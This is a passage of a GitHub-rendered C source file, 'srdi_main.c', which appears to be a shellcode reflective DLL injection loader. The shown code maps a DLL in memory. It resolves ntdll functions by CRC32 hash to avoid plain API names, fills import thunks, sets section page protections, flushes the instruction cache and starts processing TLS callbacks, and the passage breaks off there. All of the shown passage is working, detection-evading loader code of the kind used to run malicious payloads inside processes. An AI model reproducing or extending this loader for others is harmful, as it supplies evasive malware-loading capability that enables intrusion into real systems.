          <td id="file-srdi_main-c-LC74" class="blob-code blob-code-inner js-file-line">    IMAGE_DATA_DIRECTORY images_directory = nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">DataDirectory</span>[IMAGE_DIRECTORY_ENTRY_IMPORT];</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L75" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="75"></td>
          <td id="file-srdi_main-c-LC75" class="blob-code blob-code-inner js-file-line">    UNICODE_STRING import_library_name;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L76" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="76"></td>
          <td id="file-srdi_main-c-LC76" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L77" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="77"></td>
          <td id="file-srdi_main-c-LC77" class="blob-code blob-code-inner js-file-line">    import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(images_directory.<span class="pl-smi">VirtualAddress</span> + (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L78" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="78"></td>
          <td id="file-srdi_main-c-LC78" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *current_library = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L79" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="79"></td>
          <td id="file-srdi_main-c-LC79" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L80" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="80"></td>
          <td id="file-srdi_main-c-LC80" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span>(import_descriptor-&gt;<span class="pl-smi">Name</span> != <span class="pl-c1">0</span>) {</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L81" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="81"></td>
          <td id="file-srdi_main-c-LC81" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">void</span> *p_ldr_load_dll = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, LdrLoadDll_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L82" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="82"></td>
          <td id="file-srdi_main-c-LC82" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">char</span> *module_name = (<span class="pl-k">char</span> *)dll_base + import_descriptor-&gt;<span class="pl-smi">Name</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L83" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="83"></td>
          <td id="file-srdi_main-c-LC83" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">wchar_t</span> w_module_name[MAX_PATH];</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L84" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="84"></td>
          <td id="file-srdi_main-c-LC84" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">unsigned</span> <span class="pl-k">long</span> num_converted;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L85" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="85"></td>
          <td id="file-srdi_main-c-LC85" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L86" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="86"></td>
          <td id="file-srdi_main-c-LC86" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">void</span> *p_rtl_multi_byte_to_unicode_n = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, RtlMultiByteToUnicodeN_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L87" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="87"></td>
          <td id="file-srdi_main-c-LC87" class="blob-code blob-code-inner js-file-line">        RtlMultiByteToUnicodeN_t g_rtl_multi_byte_to_unicode_n = (RtlMultiByteToUnicodeN_t) p_rtl_multi_byte_to_unicode_n;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L88" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="88"></td>
          <td id="file-srdi_main-c-LC88" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>((status = <span class="pl-c1">g_rtl_multi_byte_to_unicode_n</span>(w_module_name, <span class="pl-k">sizeof</span>(w_module_name), &amp;num_converted, module_name, <span class="pl-c1">sl</span>(module_name) +<span class="pl-c1">1</span>)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L89" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="89"></td>
          <td id="file-srdi_main-c-LC89" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> -<span class="pl-c1">5</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L90" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="90"></td>
          <td id="file-srdi_main-c-LC90" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L91" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="91"></td>
          <td id="file-srdi_main-c-LC91" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">void</span> *p_rtl_init_unicode_string = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, RtlInitUnicodeString_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L92" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="92"></td>
          <td id="file-srdi_main-c-LC92" class="blob-code blob-code-inner js-file-line">        RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L93" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="93"></td>
          <td id="file-srdi_main-c-LC93" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">g_rtl_init_unicode_string</span>(&amp;import_library_name, w_module_name);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L94" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="94"></td>
          <td id="file-srdi_main-c-LC94" class="blob-code blob-code-inner js-file-line">        LdrLoadDll_t g_ldr_load_dll = (LdrLoadDll_t) p_ldr_load_dll;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L95" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="95"></td>
          <td id="file-srdi_main-c-LC95" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>((status = <span class="pl-c1">g_ldr_load_dll</span>(<span class="pl-c1">NULL</span>, <span class="pl-c1">NULL</span>, &amp;import_library_name, &amp;current_library)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L96" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="96"></td>
          <td id="file-srdi_main-c-LC96" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> -<span class="pl-c1">6</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L97" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="97"></td>
          <td id="file-srdi_main-c-LC97" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L98" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="98"></td>
          <td id="file-srdi_main-c-LC98" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (current_library){</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L99" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="99"></td>
          <td id="file-srdi_main-c-LC99" class="blob-code blob-code-inner js-file-line">            ANSI_STRING a_string;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L100" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="100"></td>
          <td id="file-srdi_main-c-LC100" class="blob-code blob-code-inner js-file-line">            PIMAGE_THUNK_DATA thunk = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L101" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="101"></td>
          <td id="file-srdi_main-c-LC101" class="blob-code blob-code-inner js-file-line">            PIMAGE_THUNK_DATA original_thunk = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L102" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="102"></td>
          <td id="file-srdi_main-c-LC102" class="blob-code blob-code-inner js-file-line">            thunk = (PIMAGE_THUNK_DATA)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + import_descriptor-&gt;<span class="pl-smi">FirstThunk</span>);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L103" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="103"></td>
          <td id="file-srdi_main-c-LC103" class="blob-code blob-code-inner js-file-line">            original_thunk = (PIMAGE_THUNK_DATA)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + import_descriptor-&gt;<span class="pl-smi">OriginalFirstThunk</span>);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L104" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="104"></td>
          <td id="file-srdi_main-c-LC104" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">while</span> (thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">AddressOfData</span> != <span class="pl-c1">0</span>){</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L105" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="105"></td>
          <td id="file-srdi_main-c-LC105" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">void</span> *p_ldr_get_procedure_address = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, LdrGetProcedureAddress_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L106" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="106"></td>
          <td id="file-srdi_main-c-LC106" class="blob-code blob-code-inner js-file-line">                LdrGetProcedureAddress_t g_ldr_get_procedure_address = (LdrGetProcedureAddress_t) p_ldr_get_procedure_address;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L107" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="107"></td>
          <td id="file-srdi_main-c-LC107" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> (<span class="pl-c1">IMAGE_SNAP_BY_ORDINAL</span>(thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Ordinal</span>)) {</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L108" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="108"></td>
          <td id="file-srdi_main-c-LC108" class="blob-code blob-code-inner js-file-line">                    <span class="pl-c1">g_ldr_get_procedure_address</span>(current_library, <span class="pl-c1">NULL</span>, (WORD) original_thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Ordinal</span>, (PVOID *) &amp;(thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Function</span>));</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L109" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="109"></td>
          <td id="file-srdi_main-c-LC109" class="blob-code blob-code-inner js-file-line">                } <span class="pl-k">else</span> {</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L110" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="110"></td>
          <td id="file-srdi_main-c-LC110" class="blob-code blob-code-inner js-file-line">                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">AddressOfData</span>);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L111" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="111"></td>
          <td id="file-srdi_main-c-LC111" class="blob-code blob-code-inner js-file-line">                    <span class="pl-c1">FILL_STRING</span>(a_string, functionName-&gt;<span class="pl-smi">Name</span>);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L112" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="112"></td>
          <td id="file-srdi_main-c-LC112" class="blob-code blob-code-inner js-file-line">                    <span class="pl-c1">g_ldr_get_procedure_address</span>(current_library, &amp;a_string, <span class="pl-c1">0</span>, (PVOID *) &amp;(thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Function</span>));</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L113" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="113"></td>
          <td id="file-srdi_main-c-LC113" class="blob-code blob-code-inner js-file-line">                }</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L114" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="114"></td>
          <td id="file-srdi_main-c-LC114" class="blob-code blob-code-inner js-file-line">                ++thunk;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L115" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="115"></td>
          <td id="file-srdi_main-c-LC115" class="blob-code blob-code-inner js-file-line">                ++original_thunk;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L116" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="116"></td>
          <td id="file-srdi_main-c-LC116" class="blob-code blob-code-inner js-file-line">            }</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L117" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="117"></td>
          <td id="file-srdi_main-c-LC117" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L118" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="118"></td>
          <td id="file-srdi_main-c-LC118" class="blob-code blob-code-inner js-file-line">        import_descriptor++;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L119" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="119"></td>
          <td id="file-srdi_main-c-LC119" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L120" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="120"></td>
          <td id="file-srdi_main-c-LC120" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L121" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="121"></td>
          <td id="file-srdi_main-c-LC121" class="blob-code blob-code-inner js-file-line">    PIMAGE_SECTION_HEADER section_header = <span class="pl-c1">IMAGE_FIRST_SECTION</span>(nt_headers);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L122" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="122"></td>
          <td id="file-srdi_main-c-LC122" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; nt_headers-&gt;<span class="pl-smi">FileHeader</span>.<span class="pl-smi">NumberOfSections</span>; i++, section_header++) {</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L123" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="123"></td>
          <td id="file-srdi_main-c-LC123" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (section_header-&gt;<span class="pl-smi">SizeOfRawData</span>) {</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L124" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="124"></td>
          <td id="file-srdi_main-c-LC124" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">unsigned</span> <span class="pl-k">long</span> executable = (section_header-&gt;<span class="pl-smi">Characteristics</span> &amp; IMAGE_SCN_MEM_EXECUTE) != <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L125" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="125"></td>
          <td id="file-srdi_main-c-LC125" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">unsigned</span> <span class="pl-k">long</span> readable = (section_header-&gt;<span class="pl-smi">Characteristics</span> &amp; IMAGE_SCN_MEM_READ) != <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L126" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="126"></td>
          <td id="file-srdi_main-c-LC126" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">unsigned</span> <span class="pl-k">long</span> writeable = (section_header-&gt;<span class="pl-smi">Characteristics</span> &amp; IMAGE_SCN_MEM_WRITE) != <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L127" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="127"></td>
          <td id="file-srdi_main-c-LC127" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">unsigned</span> <span class="pl-k">long</span> protect = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L128" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="128"></td>
          <td id="file-srdi_main-c-LC128" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L129" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="129"></td>
          <td id="file-srdi_main-c-LC129" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> (!executable &amp;&amp; !readable &amp;&amp; !writeable)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L130" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="130"></td>
          <td id="file-srdi_main-c-LC130" class="blob-code blob-code-inner js-file-line">                protect = PAGE_NOACCESS;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L131" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="131"></td>
          <td id="file-srdi_main-c-LC131" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> <span class="pl-k">if</span> (!executable &amp;&amp; !readable &amp;&amp; writeable)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L132" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="132"></td>
          <td id="file-srdi_main-c-LC132" class="blob-code blob-code-inner js-file-line">                protect = PAGE_WRITECOPY;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L133" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="133"></td>
          <td id="file-srdi_main-c-LC133" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> <span class="pl-k">if</span> (!executable &amp;&amp; readable &amp;&amp; !writeable)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L134" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="134"></td>
          <td id="file-srdi_main-c-LC134" class="blob-code blob-code-inner js-file-line">                protect = PAGE_READONLY;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L135" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="135"></td>
          <td id="file-srdi_main-c-LC135" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> <span class="pl-k">if</span> (!executable &amp;&amp; readable &amp;&amp; writeable)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L136" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="136"></td>
          <td id="file-srdi_main-c-LC136" class="blob-code blob-code-inner js-file-line">                protect = PAGE_READWRITE;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L137" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="137"></td>
          <td id="file-srdi_main-c-LC137" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> <span class="pl-k">if</span> (executable &amp;&amp; !readable &amp;&amp; !writeable)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L138" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="138"></td>
          <td id="file-srdi_main-c-LC138" class="blob-code blob-code-inner js-file-line">                protect = PAGE_EXECUTE;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L139" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="139"></td>
          <td id="file-srdi_main-c-LC139" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> <span class="pl-k">if</span> (executable &amp;&amp; !readable &amp;&amp; writeable)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L140" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="140"></td>
          <td id="file-srdi_main-c-LC140" class="blob-code blob-code-inner js-file-line">                protect = PAGE_EXECUTE_WRITECOPY;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L141" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="141"></td>
          <td id="file-srdi_main-c-LC141" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> <span class="pl-k">if</span> (executable &amp;&amp; readable &amp;&amp; !writeable)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L142" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="142"></td>
          <td id="file-srdi_main-c-LC142" class="blob-code blob-code-inner js-file-line">                protect = PAGE_EXECUTE_READ;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L143" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="143"></td>
          <td id="file-srdi_main-c-LC143" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span> <span class="pl-k">if</span> (executable &amp;&amp; readable &amp;&amp; writeable)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L144" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="144"></td>
          <td id="file-srdi_main-c-LC144" class="blob-code blob-code-inner js-file-line">                protect = PAGE_EXECUTE_READWRITE;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L145" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="145"></td>
          <td id="file-srdi_main-c-LC145" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L146" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="146"></td>
          <td id="file-srdi_main-c-LC146" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> (section_header-&gt;<span class="pl-smi">Characteristics</span> &amp; IMAGE_SCN_MEM_NOT_CACHED)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L147" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="147"></td>
          <td id="file-srdi_main-c-LC147" class="blob-code blob-code-inner js-file-line">                protect |= PAGE_NOCACHE;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L148" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="148"></td>
          <td id="file-srdi_main-c-LC148" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L149" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="149"></td>
          <td id="file-srdi_main-c-LC149" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">void</span> *p_nt_protect_virtual_memory = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtProtectVirtualMemory_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L150" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="150"></td>
          <td id="file-srdi_main-c-LC150" class="blob-code blob-code-inner js-file-line">            NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t) p_nt_protect_virtual_memory;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L151" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="151"></td>
          <td id="file-srdi_main-c-LC151" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">size_t</span> size = section_header-&gt;<span class="pl-smi">SizeOfRawData</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L152" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="152"></td>
          <td id="file-srdi_main-c-LC152" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">void</span> *address = dll_base + section_header-&gt;<span class="pl-smi">VirtualAddress</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L153" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="153"></td>
          <td id="file-srdi_main-c-LC153" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span>((status = <span class="pl-c1">g_nt_protect_virtual_memory</span>(<span class="pl-c1">NtCurrentProcess</span>(), &amp;address, &amp;size, protect, &amp;protect)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L154" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="154"></td>
          <td id="file-srdi_main-c-LC154" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">return</span> -<span class="pl-c1">7</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L155" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="155"></td>
          <td id="file-srdi_main-c-LC155" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L156" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="156"></td>
          <td id="file-srdi_main-c-LC156" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L157" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="157"></td>
          <td id="file-srdi_main-c-LC157" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L158" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="158"></td>
          <td id="file-srdi_main-c-LC158" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_nt_flush_instruction_cache = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtFlushInstructionCache_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L159" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="159"></td>
          <td id="file-srdi_main-c-LC159" class="blob-code blob-code-inner js-file-line">    NtFlushInstructionCache_t g_nt_flush_instruction_cache = (NtFlushInstructionCache_t) p_nt_flush_instruction_cache;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L160" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="160"></td>
          <td id="file-srdi_main-c-LC160" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">g_nt_flush_instruction_cache</span>((HANDLE) -<span class="pl-c1">1</span>, <span class="pl-c1">NULL</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L161" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="161"></td>
          <td id="file-srdi_main-c-LC161" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L162" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="162"></td>
          <td id="file-srdi_main-c-LC162" class="blob-code blob-code-inner js-file-line">    PIMAGE_TLS_CALLBACK *callback;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L163" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="163"></td>
          <td id="file-srdi_main-c-LC163" class="blob-code blob-code-inner js-file-line">    PIMAGE_DATA_DIRECTORY tls_entry = &amp;nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">DataDirectory</span>[IMAGE_DIRECTORY_ENTRY_TLS];</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L164" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="164"></td>
          <td id="file-srdi_main-c-LC164" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span>(tls_entry-&gt;<span class="pl-smi">Size</span>) {</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L165" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="165"></td>
          <td id="file-srdi_main-c-LC165" class="blob-code blob-code-inner js-file-line">        PIMAGE_TLS_DIRECTORY tls_dir = (PIMAGE_TLS_DIRECTORY)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + tls_entry-&gt;<span class="pl-smi">VirtualAddress</span>);</td>
        </tr>
        <tr>
